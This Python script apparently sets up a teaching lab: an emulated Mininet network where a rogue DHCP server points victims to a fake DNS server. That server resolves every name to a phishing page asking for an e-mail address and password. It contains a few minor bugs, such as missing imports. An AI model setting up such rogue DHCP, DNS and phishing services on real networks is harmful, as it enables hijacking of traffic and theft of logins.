#!/usr/bin/env python3
from mininet.topo import Topo
from mininet.net import Mininet

from mininet.link import TCLink
from mininet.log import setLogLevel

from mininet.clean import Cleanup
from mininet.cli import CLI

from mininet.node import OVSController


class DhcpTopo(Topo):
    "Three switch topology"
    def build( self ):
        "Create custom topo."
        # Add hosts and switches
        h1 = self.addHost('h1', ip=None)
        h2 = self.addHost('h2', ip='10.0.0.102/24')
        h3 = self.addHost('h3', ip='10.0.0.103/24')

        s1 = self.addSwitch('s1')

        # Add host links
        self.addLink(h1, s1, cls=TCLink, delay='10ms')
        self.addLink(h2, s1, cls=TCLink, bw=1, delay='200ms', use_htb=True)
        self.addLink(h3, s1, cls=TCLink, delay='10ms')



def mountPrivateResolvconf(host):
    "Create/mount private /etc/resolv.conf for host"
    etc = '/tmp/etc-%s' % host
    host.cmd('mkdir -p', etc)
    host.cmd('mount --bind /etc', etc )
    host.cmd('mount -n -t tmpfs tmpfs /etc' )
    host.cmd('ln -s %s/* /etc/' % etc )
    host.cmd('rm /etc/resolv.conf' )
    host.cmd('cp %s/resolv.conf /etc/' % etc )

def unmountPrivateResolvconf(host):
    "Unmount private /etc dir for host"
    etc = '/tmp/etc-%s' % host
    host.cmd('umount /etc')
    host.cmd('umount',etc)
    host.cmd('rmdir',etc )


def startFakeDNS( host ):
    "Start Fake DNS server"
    print( '* Starting fake DNS server', host, 'at', host.IP(), '\n' )
    host.cmd( '/usr/sbin/dnsmasq -k -A /#/%s 1>/tmp/dns.log 2>&1 &' %  host.IP() )

def stopFakeDNS( host ):
    "Stop Fake DNS server"
    print( '* Stopping fake DNS server', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %dnsmasq' )

# Evil web server

def startEvilWebServer( host ):
    "Start evil web server"
    print( '* Starting web server', host, 'at', host.IP(), '\n' )
    webdir = '/tmp/evilwebserver'
    host.cmd('rm -rf', webdir )
    host.cmd( 'mkdir -p', webdir )
    with open( webdir + '/index.html', 'w' ) as f:
        # If we wanted to be truly evil, we could add this
        # to make it hard to retype URLs in firefox
        # f.write( '<meta http-equiv="refresh" content="1"> \n' )
        f.write( '<html><p>You have been pwned! Please sign in.<p>\n'
                 '<body><form action="">\n'
                 'e-mail: <input type="text" name="firstname"><br>\n'
                 'password: <input type="text" name="firstname"><br>\n'
                 '</form></body></html>' )
    host.cmd( 'cd', webdir )
    host.cmd( 'python3 -m http.server 80 >& /tmp/http.log &' )

def stopEvilWebServer( host ):
    "Stop evil web server"
    print( '* Stopping web server', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %python' )


# DHCP server functions and data

DNSTemplate = """
start		10.0.0.10
end		10.0.0.90
option	subnet	255.255.255.0
option	domain	local
option	lease	7  # seconds
"""
# option dns 8.8.8.8
# interface h1-eth0

def makeDHCPconfig( filename, intf, gw, dns ):
    "Create a DHCP configuration file"
    config = (
        'interface %s' % intf,
        DNSTemplate,
        'option router %s' % gw,
        'option dns %s' % dns,
        '' )
    with open( filename, 'w' ) as f:
        f.write( '\n'.join( config ) )

def startDHCPserver( host, gw, dns ):
    "Start DHCP server on host with specified DNS server"
    print( '* Starting DHCP server on', host, 'at', host.IP(), '\n' )
    dhcpConfig = '/tmp/%s-udhcpd.conf' % host
    makeDHCPconfig( dhcpConfig, host.defaultIntf(), gw, dns )
    host.cmd( 'udhcpd -f', dhcpConfig,
              '1>/tmp/%s-dhcp.log 2>&1  &' % host )

def stopDHCPserver( host ):
    "Stop DHCP server on host"
    print( '* Stopping DHCP server on', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %udhcpd' )


# DHCP client functions

def startDHCPclient( host ):
    "Start DHCP client on host"
    intf = host.defaultIntf()
    host.cmd( 'dhclient -v -d -r', intf )
    host.cmd( 'dhclient -v -d 1> /tmp/dhclient.log 2>&1', intf, '&' )

def stopDHCPclient( host ):
    host.cmd( 'kill %dhclient' )

def waitForIP( host ):
    "Wait for an IP address"
    info( '*', host, 'waiting for IP address' )
    while True:
        host.defaultIntf().updateIP()
        if host.IP():
            break
        info( '.' )
        sleep( 1 )
    info( '\n' )
    info( '*', host, 'is now using',
          host.cmd( 'grep nameserver /etc/resolv.conf' ) )

def main():
    r = None
    Cleanup.cleanup()
    topo = DhcpTopo()

    net = Mininet(topo, controller=OVSController, link=TCLink, cleanup=True)
    net.addNAT(ip='10.0.0.1/24').configDefault()
    net.start()

    print("Started")


    h1 = net.get('h1')
    h2 = net.get('h2')
    h3 = net.get('h3')
    s1 = net.get('s1')
    nat0 = net.get('nat0')

    mountPrivateResolvconf(h1)

    startDHCPserver(h2, nat0.IP(), '9.9.9.9')
    startDHCPserver(h3, nat0.IP(), h3.IP())
    startFakeDNS(h3)
    startEvilWebServer(h3)

    CLI(net)

    unmountPrivateResolvconf(h1)
    net.stop()


if __name__ == "__main__":
    setLogLevel("info")
    main()

